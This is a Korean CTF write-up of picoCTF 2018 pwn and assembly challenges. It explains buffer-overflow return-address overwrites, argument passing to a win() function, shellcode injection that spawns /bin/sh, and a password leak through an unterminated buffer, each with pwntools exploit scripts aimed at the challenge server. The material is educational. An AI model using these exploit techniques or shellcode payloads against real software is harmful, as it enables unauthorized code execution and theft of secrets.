---
title: "picoCTF 2018: Pwn and Assembly Challenges"
date: 2018-09-28
description: "picoCTF 2018 pwn 및 어셈블리 챌린지 풀이: 버퍼 오버플로우 시리즈, x86 어셈블리 문제, 셸코드 실행"
tags: ["picoCTF", "pwn", "buffer-overflow", "assembly", "shellcode", "CTF"]
platform: "ctf"
category: "pwn"
difficulty: "easy"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## Buffer Overflow 0 — 150점

소스 코드와 바이너리를 보고 buffer overflow에 대한 이해를 요구하는 문제다.

핵심은 `sigsegv_handler` 함수와 메인 입력 루틴이다. `sigsegv_handler`는 SIGSEGV 시그널 핸들러로 등록되어 있다 — 세그멘테이션 폴트가 발생하면 일반적인 크래시 대신 stderr로 플래그를 출력한다.

즉, 의도적으로 에러를 발생시키면 플래그가 출력된다. 버퍼보다 많은 값을 입력해 세그폴트를 유발한다.

```bash
python -c 'print "A"*200' | ./vuln
```

---

## Buffer Overflow 1 — 200점

바이너리에는 `gets()`로 입력을 받는 `vuln()` 함수와, 플래그를 출력하는 별도의 `win()` 함수가 있다. 목표는 `vuln`의 리턴 주소를 `win`으로 덮어쓰는 것이다.

바이너리를 로컬에서 다운로드하여 디버깅으로 정확한 오프셋을 파악한다. `vuln` 함수의 스택 구조를 분석하면:

```
buf[32] + padding[12] = 44바이트 → ret 도달
```

스택 레이아웃: `buffer[32] | saved regs[12] | ret[4]`

처음 실행했을 때 `win()` 함수를 생각하지 않고 RTL(Return-to-Library)을 시도했다가 뒤늦게 틀린 것을 알았다. 서버에서 파일을 받아 디버깅하니 ret 주소와 간격이 조금 더 있었다.

```python
from pwn import *

p = remote("2018shell2.picoctf.com", PORT)

win = 0x080485cb

payload = ""
payload += "A" * 44
payload += p32(win)

p.sendline(payload)
p.interactive()
```

---

## Buffer Overflow 2 — 250점

Buffer Overflow 1과 구조는 같지만 `win()` 함수가 플래그를 출력하려면 두 개의 특정 인자가 필요하다:

```c
void win(int arg1, int arg2) {
    if (arg1 == 0xDEADBEEF && arg2 == 0xDEADC0DE)
        // 플래그 출력
}
```

이것이 RTL(Return-to-Library) 기법이다. 프로그램은 컴파일 시 필요한 함수만 적재하고 다른 함수들은 실행 시 공유하여 사용한다. x86-32에서 리턴 주소 덮어쓰기로 함수를 호출할 때, 인자는 가짜 리턴 주소 뒤 스택에 전달된다.

페이로드 레이아웃:

```
buffer[100] | dummy[12] | win_addr[4] | fake_ret[4] | arg1[4] | arg2[4]
```

```python
from pwn import *

p = remote("2018shell2.picoctf.com", PORT)

win = 0x08048676

payload = ""
payload += "A" * 112
payload += p32(win)
payload += "AAAA"          # win()의 가짜 리턴 주소
payload += p32(0xDEADBEEF) # arg1
payload += p32(0xDEADC0DE) # arg2

p.sendline(payload)
p.interactive()
```

---

## Assembly 0 — 150점

어셈블리 코드를 보고 리턴값을 추측하는 문제다.

어셈블리 코드를 C로 변환하면 간단한 레지스터 연산이다:

```c
int f(int a, int b) {
    return a + b; // 또는 동등한 연산
}
```

플래그는 주어진 입력값으로 함수를 실행한 리턴값의 10진수 표현이다.

---

## Assembly 1 — 200점

어셈블리 두 번째 문제. 0x255를 입력했을 때의 리턴값을 구하면 된다.

어셈블리가 좀 길다. `goto`문으로 조건 분기를 표현하여 C로 변환하면 다음과 같다:

```c
int f(int x) {
    int result = 0;
    again:
        if (x <= 0) return result;
        result += x;
        x--;
        goto again;
}
```

이 문제를 풀면서 `goto`문을 처음 써봤다. `x = 0x255 = 597`로 실행:

```python
x = 0x255
result = 0
while x > 0:
    result += x
    x -= 1
print(result)
```

리턴값을 포맷에 맞게 처리하면 플래그가 된다.

---

## Assembly 2 — 250점

여러 레지스터와 메모리 연산을 포함하는 더 복잡한 어셈블리 스니펫을 손으로 추적하는 연습이다. 접근법은 동일하다: 각 명령을 C로 변환하고, 레지스터 상태를 추적하여 최종 `eax` 값을 계산한다.

---

## Assembly 3 — 400점

`al`/`ah` 바이트 레지스터 연산이 복잡하여 순수하게 손으로 추적하기 어렵다.

![Assembly-3 문제 어셈블리 코드](/images/writeups/picoctf-2018/assembly-3.png)

의도된 접근법: 제공된 어셈블리를 셸코드로 취급하여 함수 포인터로 캐스팅하고 실행하여 리턴값을 직접 관찰한다.

```c
#include <stdio.h>
#include <string.h>

int main() {
    // 문제에서 제공한 어셈블리 바이트
    char shellcode[] = "\x...";
    
    int (*fp)(int, int, int) = (int (*)(int, int, int))(void *)shellcode;
    printf("%d\n", fp(arg1, arg2, arg3));
    return 0;
}
```

`-z execstack`으로 컴파일하여 스택 실행을 허용하고, 실행하여 리턴값을 플래그로 읽는다.

---

## Shellcode — 200점

바이너리가 `gets()`로 버퍼에 입력을 받은 뒤, 그 버퍼를 코드로 실행한다:

```c
void vuln() {
    char buf[64];
    gets(buf);
    // buf를 함수로 실행
    ((void(*)())buf)();
}
```

`((void(*)())buf)()`는 버퍼를 직접 실행 가능하게 만드는 캐스팅이다 — 전형적인 셸코드 인젝션이다. NX가 비활성화되어 있으므로 버퍼에 배치된 셸코드가 함수 포인터가 호출될 때 실행된다.

표준 Linux x86 `/bin/sh` 셸코드가 여기서 작동한다:

```python
from pwn import *

p = remote("2018shell2.picoctf.com", PORT)

shellcode = asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()
```

---

## Leak Me — 200점

바이너리가 `fgets()`로 이름을 읽고 마지막 개행문자를 null로 설정하여 제거한다. 그 다음 파일에서 패스워드를 읽고 사용자 입력을 받아 검증한다.

취약점은 null 바이트 제거 동작이다. 이름 버퍼가 용량만큼 채워지면 `fgets`가 `name[255]` 위치에 null 종료자를 배치한다. 그런데 코드가 `name[strlen(name) - 1] = '\0'`을 실행하여 마지막 null을 제거한다 — 이로써 name 버퍼가 종료자 없이 남는다. 이후 `puts(name)`이 버퍼 경계를 넘어 인접한 `password` 배열까지 읽는다.

스택 레이아웃:

```
name[256] | password[64] | input_password[64]
```

`name`을 완전히 채우면(256바이트) null 제거로 버퍼가 종료자 없이 남고, `puts`가 바로 다음에 저장된 패스워드까지 출력해준다.

```python
from pwn import *

p = remote("2018shell2.picoctf.com", PORT)

# 이름 버퍼를 완전히 채워서 null 제거 발생
p.sendline("A" * 256)

# 누출된 출력 읽기 — 패스워드가 메모리에서 이름 다음에 위치
output = p.recvline()
leaked_password = output[256:].split('\n')[0]
print("Leaked password:", leaked_password)

# 정상적으로 패스워드 입력
p.sendline(leaked_password)
p.interactive()
```
